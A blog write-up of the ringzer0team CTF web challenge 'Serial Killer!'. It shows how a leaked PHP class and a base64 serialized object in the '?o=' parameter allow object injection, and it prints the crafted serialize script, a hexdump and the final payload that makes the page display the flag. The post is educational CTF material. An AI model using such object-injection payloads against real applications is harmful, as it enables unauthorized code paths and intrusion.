---
layout: post
title:  "Writeup - ringzer0team.com challenges (web 41) - 'Serial Killer!'"
date:   2018-05-21 11:14:41 -0400
categories: ringzer0team.com writeup
---
![Challenge Intro]({{ site.baseurl }}/images/rz-serial-init.png)
This challenge initially displays a timestamp on the page. Digging into the request being sent, notice that there is a base64 encoded string within the GET request:

![Challenge Intro]({{ site.baseurl }}/images/rz-serial-base64.png)

When decoded, this is immediately recognizable as a serialized PHP object:

{% highlight php %}
O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":1:{s:6:"action";s:14:"GetCurrentDate";}}
{% endhighlight %}

What happens if we add a single character within the base64 encoded "?o=" serialized value to upset the object structure? A wild stack trace appears:

![Challenge Intro]({{ site.baseurl }}/images/rz-serial-stack-trace.png)

Cleaning this up reveals the following PHP code. This shows the same 'RandomClass' class as exists in the discovered serialized string. What if we could inject our own object with arbitrary values and somehow retrieve the flag? In order to do that, we must first understand how the available PHP ['magic methods'](http://php.net/manual/en/language.oop5.magic.php) within the stack trace might assist us. Recommended reading for understanding PHP Object Injection will also be linked at the bottom of this post.

{% highlight php linenos %}
<?php

class RandomClass {

    private static $instance;
    private $uStruct;
    
    public function __construct() {
        $this->uStruct = (object) array();
    }
    
    public static function GetInstance() {
        if (!isset(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    public function __set($key, $value) {
        $this->uStruct->$key = $value;
    }

    public function __get($key) {
        return $this->uStruct->$key;
    }
    
    public function DoAction() {
        $action = $this->uStruct->action;
        $this->$action();
    }

    public function GetCurrentDate() {
        GetCurrentDate($this->uStruct);
    }

    public function ShowFlag() {
        if ($this->uStruct->time !== null && $this->uStruct->flag == 'Please?') {
            ShowFlag($this->uStruct);
        }
    }

    public function GetOutput() {
        return $this->uStruct->output;
    }
}
?>
{% endhighlight %}

Walking through the PHP code, first notice two private members (?). Immediately following that is the __construct() method. This magic method is called on each newly-created object, generally utilized for initialization of some sort. Inside the constructor is an empty array cast to an object, which is assigned to $this->uStruct.

From the PHP documentation, ["If a value of any other type is converted to an object, a new instance of the stdClass built-in class is created. If the value was NULL, the new instance will be empty. An array converts to an object with properties named by keys and corresponding values."](http://php.net/manual/en/language.types.object.php#language.types.object.casting)

The next magic method is __set. Reading PHP docs, ["__set() is run when writing data to inaccessible properties."](http://php.net/manual/en/language.oop5.overloading.php#language.oop5.overloading.members). This looks potentially promising. The __get() magic method is also defined here, but what really catches the eyes is the ShowFlag() function. If only it was possible to set the variables $this->uStruct->time and $this->uStruct->flag and retrieve the flag...

With the leak of the RandomClass class, we can create our own serialized object, base64 encode it, and provide as the value for "?o=" within the HTTP query string.

{% highlight php %}
$obj = new RandomClass();
$obj->time = "1";
$obj->flag = "Please?";
$obj->action = "ShowFlag";
echo serialize($obj);
{% endhighlight %}

{% highlight %}
root@kali:~/Challenge41# php sploit.php 
O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":3:{s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";s:6:"action";s:8:"ShowFlag";}}

root@kali:~/Challenge41# php sploit.php | hexdump -C
00000000  4f 3a 31 31 3a 22 52 61  6e 64 6f 6d 43 6c 61 73  |O:11:"RandomClas|
00000010  73 22 3a 31 3a 7b 73 3a  32 30 3a 22 00 52 61 6e  |s":1:{s:20:".Ran|
00000020  64 6f 6d 43 6c 61 73 73  00 75 53 74 72 75 63 74  |domClass.uStruct|
00000030  22 3b 4f 3a 38 3a 22 73  74 64 43 6c 61 73 73 22  |";O:8:"stdClass"|
00000040  3a 33 3a 7b 73 3a 34 3a  22 74 69 6d 65 22 3b 73  |:3:{s:4:"time";s|
00000050  3a 31 3a 22 31 22 3b 73  3a 34 3a 22 66 6c 61 67  |:1:"1";s:4:"flag|
00000060  22 3b 73 3a 37 3a 22 50  6c 65 61 73 65 3f 22 3b  |";s:7:"Please?";|
00000070  73 3a 36 3a 22 61 63 74  69 6f 6e 22 3b 73 3a 38  |s:6:"action";s:8|
00000080  3a 22 53 68 6f 77 46 6c  61 67 22 3b 7d 7d        |:"ShowFlag";}}|
0000008e

root@kali:~/Challenge41# php sploit.php | base64
TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0
ZENsYXNzIjozOntzOjQ6InRpbWUiO3M6MToiMSI7czo0OiJmbGFnIjtzOjc6IlBsZWFzZT8iO3M6
NjoiYWN0aW9uIjtzOjg6IlNob3dGbGFnIjt9fQ==

{% endhighlight %}

Based on a review of the code, this object we have constructed should be suitable to reach the ShowFlag() method properly, considering that **(a)** $this->uStruct->time is not null, **(b)** $this->uStruct->flag is set to 'Please?', and **(c)** $obj->action is set to 'ShowFlag'. Sending this payload results in the flag being displayed on the page.

![Flag]({{ site.baseurl }}/images/rz-flag.png)
